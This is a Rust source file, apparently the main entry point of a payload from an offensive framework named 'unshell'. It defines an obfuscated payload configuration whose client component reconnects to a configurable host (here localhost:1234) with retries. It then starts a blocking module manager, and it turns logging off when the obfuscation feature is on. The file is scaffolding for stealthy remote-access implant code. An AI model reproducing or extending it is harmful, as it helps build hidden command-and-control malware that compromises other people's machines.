use std::collections::HashMap;

use static_init::dynamic;
use unshell_lib::{
    ModuleError,
    config::{PayloadConfig, RuntimeConfig},
    module::Manager,
};
use unshell_obfuscate::{obs, symbol};

#[macro_use]
extern crate unshell_lib;

// The main and initial 'configuration' for a payload

#[dynamic]
static PAYLOAD_CONFIG: PayloadConfig = PayloadConfig {
    id: symbol!("Test ID"),
    components: unshell_lib::get_components(),
    runtime_config: vec![RuntimeConfig {
        parent_component: symbol!("client").to_string(),
        name: symbol!("client runtime").to_string(),
        config: HashMap::from([
            (symbol!("host").to_string(), obs!("localhost:1234")),
            (symbol!("retry").to_string(), obs!("1000")),
        ]),
    }],
};

fn main() {
    // Init the logger
    #[cfg(not(feature = "obfuscate"))]
    unshell_lib::logger::PrettyLogger::init();

    debug!("Initialized");

    match || -> Result<(), ModuleError> {
        // let args = std::env::args();

        // TEMPORARY, load the module paths from command line args.
        // let mut modules = Vec::new();
        // for arg in args.skip(1) {
        //     debug!("Loading module: {}", arg);

        //     let mut file = File::open(arg).map_err(|e| ModuleError::Error(e.to_string().into()))?;
        //     let mut buffer = Vec::new();
        //     file.read_to_end(&mut buffer)
        //         .map_err(|e| ModuleError::Error(e.to_string().into()))?;

        //     modules.push(Module::new_bytes(&buffer)?)

        //     // modules.push(Module::new(&arg)?)
        // }

        // Run the manager, this is blocking.
        let manager = Manager::start(&PAYLOAD_CONFIG, Vec::new());

        Manager::join(manager);

        Ok(())
    }() {
        Ok(_) => {}
        Err(e) => {
            debug!("ERROR! {:?}", e);
        }
    }
}
